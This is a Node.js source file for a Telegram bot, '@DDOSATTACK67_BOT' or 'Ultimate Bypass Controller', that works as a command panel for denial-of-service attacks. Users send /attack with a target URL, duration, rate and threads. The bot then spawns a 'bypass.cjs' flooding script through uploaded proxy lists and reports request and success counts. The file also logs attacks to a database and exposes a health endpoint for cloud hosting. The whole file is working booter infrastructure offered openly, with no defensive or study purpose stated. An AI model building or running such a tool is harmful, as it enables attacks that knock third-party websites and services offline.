import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import sqlite3 from 'sqlite3';
import { createCanvas } from 'canvas';
import cron from 'node-cron';
import express from 'express';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

// DEBUG: Check token
console.log('🔍 TOKEN CHECK:');
console.log('- Token exists:', !!process.env.TELEGRAM_BOT_TOKEN);
console.log('- Token length:', process.env.TELEGRAM_BOT_TOKEN?.length);
console.log('- Token prefix:', process.env.TELEGRAM_BOT_TOKEN?.substring(0, 10) + '...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env file!');
    console.error('📌 Make sure to set TELEGRAM_BOT_TOKEN in Railway Variables');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);

// Admin ID - YOU
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 3,
    UPDATE_INTERVAL: 5000,
    MIN_UPDATE_PERCENT: 5,
    MESSAGE_CACHE_TIME: 3000,
    MAX_PROXY_LINES: 1000,
    BOT_NETWORK: [] // Add other bot tokens here for broadcasting
};

// Store running attacks
const attacks = new Map();
const lastUpdates = new Map();
const lastPercent = new Map();
const templates = new Map();
const schedule = new Map();
const botNetwork = CONFIG.BOT_NETWORK;

// Initialize SQLite database
const db = new sqlite3.Database('attacks.db');
db.run(`CREATE TABLE IF NOT EXISTS attacks (
    id TEXT PRIMARY KEY,
    url TEXT,
    duration INTEGER,
    requests INTEGER,
    success INTEGER,
    fail INTEGER,
    rate INTEGER,
    threads INTEGER,
    timestamp INTEGER,
    username TEXT
)`);

// ========== HEALTH CHECK SERVER FOR RAILWAY ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';  // Bind to IPv6 for Railway

// Helper function to count running attacks
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

// Basic root endpoint
app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head><title>Telegram Bypass Bot</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span style="color: green; font-weight: bold;">RUNNING</span></p>
                <p>Active Attacks: ${attacks.size}</p>
                <p>Uptime: ${Math.floor(process.uptime() / 60)} minutes</p>
                <p><a href="/health">View Health Details</a></p>
            </body>
        </html>
    `);
});

// Health check endpoint
app.get('/health', (req, res) => {
    const memory = process.memoryUsage();
    const running = countRunningAttacks();
    
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        bot: {
            username: '@DDOSATTACK67_BOT',
            admin_id: ADMIN_ID,
            attacks: {
                total: attacks.size,
                running: running,
                config_limit: CONFIG.MAX_CONCURRENT_ATTACKS
            }
        }
    });
});

// Start server
const server = app.listen(port, HOST, () => {
    console.log(`🌐 Health check server running on port ${port}`);
    console.log(`🔧 Bound to host: ${HOST}`);
});

server.on('error', (err) => {
    console.error('❌ Server error:', err);
});
// ========== END HEALTH CHECK SERVER ==========

// ========== BOT CONNECTION TEST ==========
async function testBotConnection() {
    try {
        const botInfo = await bot.telegram.getMe();
        console.log('✅ Bot connected to Telegram!');
        console.log(`📱 Bot username: @${botInfo.username}`);
        console.log(`🆔 Bot ID: ${botInfo.id}`);
        return true;
    } catch (err) {
        console.error('❌ Cannot connect to Telegram:');
        console.error('- Error:', err.message);
        console.error('- Description:', err.description || 'No description');
        return false;
    }
}

// ========== START BOT WITH POLLING ==========
async function startBot() {
    console.log('🤖 Starting bot with polling...');
    
    try {
        // Test connection first
        const connected = await testBotConnection();
        if (!connected) {
            throw new Error('Failed to connect to Telegram');
        }
        
        // Clear any existing webhook
        await bot.telegram.deleteWebhook();
        console.log('✅ Webhook cleared');
        
        // Start polling
        await bot.launch();
        console.log('✅ Bot is polling for updates!');
        console.log('📱 Send /start to @DDOSATTACK67_BOT');
        
    } catch (err) {
        console.error('❌ Failed to start bot:');
        console.error('- Error:', err.message);
        
        // Retry after 10 seconds
        console.log('⏰ Retrying in 10 seconds...');
        setTimeout(startBot, 10000);
    }
}

// Start the bot
startBot();

// Enable graceful stop
process.once('SIGINT', () => {
    console.log('\n🛑 Stopping bot...');
    bot.stop('SIGINT');
    db.close();
    process.exit(0);
});
process.once('SIGTERM', () => {
    console.log('\n🛑 Stopping bot...');
    bot.stop('SIGTERM');
    db.close();
    process.exit(0);
});

// ========== BOT COMMANDS START HERE ==========

// Start command
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Hello ${ctx.from.first_name}!\n` +
        `📊 Status: ✅ Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Main Commands:*\n` +
        `├ /attack - Start attack\n` +
        `├ /list - Show attacks\n` +
        `├ /stats - View statistics\n` +
        `├ /help - All commands\n` +
        `└ /status - Bot health\n\n` +
        `⚡ *Ready for action!*`,
        { parse_mode: 'Markdown' }
    );
});

// Help command
bot.help((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    let helpText = 
        `📚 *COMMANDS*\n\n` +
        `━━━━━━━━━━━━━━\n` +
        `🎯 *ATTACK COMMANDS*\n` +
        `━━━━━━━━━━━━━━\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `└ Start new attack\n` +
        `/stop \`<id>\`\n` +
        `└ Stop your attack\n` +
        `/list - Show active attacks\n` +
        `/progress \`<id>\` - Check progress\n\n`;
    
    if (isAdmin) {
        helpText += 
            `━━━━━━━━━━━━━━\n` +
            `👑 *ADMIN COMMANDS*\n` +
            `━━━━━━━━━━━━━━\n` +
            `/setproxy - Upload proxies\n` +
            `/stopall - Stop ALL attacks\n` +
            `/system - System stats\n\n`;
    }
    
    helpText += 
        `━━━━━━━━━━━━━━\n` +
        `ℹ️ *INFO*\n` +
        `━━━━━━━━━━━━━━\n` +
        `/stats - Bot statistics\n` +
        `/status - Bot health\n` +
        `/test - Test response`;
    
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

// Test command
bot.command('test', (ctx) => {
    ctx.reply('✅ *Bot is working!*', { parse_mode: 'Markdown' });
});

// Status command
bot.command('status', (ctx) => {
    ctx.reply(
        `✅ *Bot Status*\n\n` +
        `🟢 Online\n` +
        `⚡ Attacks: ${countRunningAttacks()} running\n` +
        `📊 Total: ${attacks.size}\n` +
        `📁 bypass.cjs: ${fs.existsSync('bypass.cjs') ? '✅' : '❌'}\n` +
        `📁 proxy.txt: ${fs.existsSync('proxy.txt') ? '✅' : '❌'}\n\n` +
        `🤖 @DDOSATTACK67_BOT`,
        { parse_mode: 'Markdown' }
    );
});

// Stats command
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((sum, a) => sum + (a.requestCount || 0), 0);
    
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *Statistics*\n\n` +
        `▶️ Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total Attacks: ${attacks.size}\n` +
        `📥 Total Requests: ${totalReqs}\n` +
        `🔄 Proxies: ${proxyCount}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// Attack command
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply(
            `❌ *Usage:*\n` +
            `/attack \`<url> <time> <rate> <threads>\`\n\n` +
            `📝 *Example:*\n` +
            `/attack \`https://httpbin.org/get 30 10 2\``,
            { parse_mode: 'Markdown' }
        );
    }

    // Check concurrent attacks limit
    const runningCount = countRunningAttacks();
    if (runningCount >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply(
            `⚠️ *Too Many Attacks*\n\n` +
            `Maximum ${CONFIG.MAX_CONCURRENT_ATTACKS} attacks allowed at once.`,
            { parse_mode: 'Markdown' }
        );
    }

    // Check if bypass.cjs exists
    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Error: bypass.cjs file not found!');
    }

    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();
    
    // Send initial message
    const statusMsg = await ctx.reply(
        `🚀 *Attack Started*\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${url}\n` +
        `⏱️ *Duration:* ${time}s\n` +
        `⚡ *Rate:* ${rate}/s\n` +
        `🧵 *Threads:* ${threads}\n\n` +
        `[${'⬜'.repeat(10)}] 0%`,
        { parse_mode: 'Markdown' }
    );

    try {
        // Spawn the attack process
        const attack = spawn('node', [
            'bypass.cjs',
            url,
            time,
            rate,
            threads,
            'proxy.txt',
            '--all',
            '--type', 'http'
        ]);

        // Store attack info
        attacks.set(attackId, {
            process: attack,
            url,
            startTime,
            duration,
            userId: ctx.from.id,
            username: ctx.from.username || ctx.from.first_name,
            chatId: ctx.chat.id,
            messageId: statusMsg.message_id,
            requestCount: 0,
            successCount: 0,
            failCount: 0,
            isRunning: true
        });

        // Handle stdout
        attack.stdout.on('data', (data) => {
            const attackData = attacks.get(attackId);
            if (!attackData) return;
            
            const output = data.toString();
            
            if (output.includes('Status: [')) {
                const match = output.match(/Status: \[([^\]]+)\]/);
                if (match) {
                    const parts = match[1].split(', ');
                    let total = 0;
                    let success = 0;
                    
                    parts.forEach(part => {
                        const [code, count] = part.split(': ');
                        if (count) {
                            const numCount = parseInt(count);
                            total += numCount;
                            if (code.startsWith('2')) success += numCount;
                        }
                    });
                    
                    attackData.requestCount = total;
                    attackData.successCount = success;
                    attackData.failCount = total - success;
                }
            }
        });

        attack.stderr.on('data', (data) => {
            console.error(`[${attackId}] Error:`, data.toString());
        });

        attack.on('close', (code) => {
            const attackData = attacks.get(attackId);
            if (!attackData) return;
            
            attackData.isRunning = false;
            
            const elapsed = Math.min(duration, Math.floor((Date.now() - startTime) / 1000));
            const successRate = attackData.requestCount > 0 
                ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
                : 0;
            
            const finalMessage = 
                `✅ *Attack Completed*\n\n` +
                `📋 *ID:* \`${attackId}\`\n` +
                `⏱️ *Time:* ${elapsed}s/${duration}s\n` +
                `📊 *Requests:* ${attackData.requestCount || 0}\n` +
                `✅ *Success:* ${attackData.successCount || 0} (${successRate}%)\n` +
                `❌ *Failed:* ${attackData.failCount || 0}\n` +
                `⚡ *Exit Code:* ${code}`;
            
            ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, finalMessage, { parse_mode: 'Markdown' });
            attacks.delete(attackId);
        });

    } catch (error) {
        ctx.reply('❌ Failed to start attack: ' + error.message);
    }
});

// List command
bot.command('list', (ctx) => {
    if (attacks.size === 0) {
        return ctx.reply('📊 *No Active Attacks*', { parse_mode: 'Markdown' });
    }

    let msg = '📊 *Active Attacks*\n\n';
    let count = 1;
    
    for (const [id, attack] of attacks) {
        if (!attack.isRunning) continue;
        
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
        const filled = Math.floor(percent / 10);
        const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
        
        msg += `*${count}.* \`${id.slice(-8)}\`\n`;
        msg += `   👤 @${attack.username}\n`;
        msg += `   🎯 ${attack.url.substring(0, 25)}...\n`;
        msg += `   📊 ${progressBar} ${percent}%\n`;
        msg += `   ⏱️ ${elapsed}s/${attack.duration}s\n`;
        count++;
        if (count > 5) break;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// Stop command
bot.command('stop', async (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    
    if (!attackId) {
        return ctx.reply('❌ Usage: `/stop <attack_id>`', { parse_mode: 'Markdown' });
    }
    
    const attack = attacks.get(attackId);
    if (!attack) {
        return ctx.reply('❌ Attack ID not found');
    }

    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ You can only stop your own attacks!');
    }

    try {
        attack.process.kill('SIGINT');
    } catch (err) {}
    
    attack.isRunning = false;
    ctx.reply(`✅ Attack \`${attackId}\` stopped.`, { parse_mode: 'Markdown' });
    attacks.delete(attackId);
});

// Setproxy command
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    ctx.reply(
        `📤 *Proxy Upload*\n\n` +
        `Send a \`proxy.txt\` file with one proxy per line.\n\n` +
        `📝 *Format:* \`ip:port\``,
        { parse_mode: 'Markdown' }
    );
});

// Handle file upload
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxies...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ *Proxies Loaded*\n\n📊 ${proxies.length} proxies`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            ctx.reply('❌ Upload failed: ' + error.message);
        }
    }
});

// Stop all attacks
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    
    const count = attacks.size;
    if (count === 0) {
        return ctx.reply('📊 No active attacks');
    }
    
    attacks.forEach((attack, id) => {
        if (attack.isRunning) {
            try {
                attack.process.kill('SIGINT');
            } catch (err) {}
        }
        attacks.delete(id);
    });
    
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// Progress command
bot.command('progress', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack ID not found');
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const filled = Math.floor(percent / 10);
    const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
    
    ctx.reply(
        `📊 *Progress*\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n` +
        `📥 ${attack.requestCount || 0} requests\n` +
        `Status: ${attack.isRunning ? '✅ Running' : '⏹️ Stopped'}`,
        { parse_mode: 'Markdown' }
    );
});

// Error handling
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
});

// Final startup message
console.log('\n╔════════════════════════════════════╗');
console.log('║    🔥 ULTIMATE BYPASS CONTROLLER   ║');
console.log('╠════════════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}                 ║`);
console.log(`║  🤖 Bot: @DDOSATTACK67_BOT          ║`);
console.log('╚════════════════════════════════════╝');